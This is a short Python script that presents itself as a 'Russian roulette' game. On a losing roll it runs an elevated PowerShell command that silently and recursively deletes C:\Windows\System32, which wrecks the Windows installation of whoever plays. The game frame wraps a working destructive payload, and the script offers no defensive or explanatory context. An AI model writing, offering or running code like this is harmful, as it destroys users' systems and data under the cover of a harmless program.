import random
import subprocess
import time
d = input("do you want to play a game (yes/no): ")
if d.lower() == 'yes':
    print("if i win i take your system")
    while True:
        print("Russian roulette started")
        dd = input("Are you ready (yes/no): ")
        if dd.lower() != 'yes':
            print("You are scared, huh?")
            break
        gun = random.randint(0, 6)
        if gun == 1:
            print("You lost the game sys 32 will be deleted in 5 sec.")
            time.sleep(5)
            command = 'powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList \'/k del /s /q C:\Windows\System32\'"'
            subprocess.run(command, shell=True)
            break
        else:
            print("You won this round.")
        continue1 = input("Do you want to play again? (yes/no): ").strip().lower()
        if continue1 != 'yes':
            break
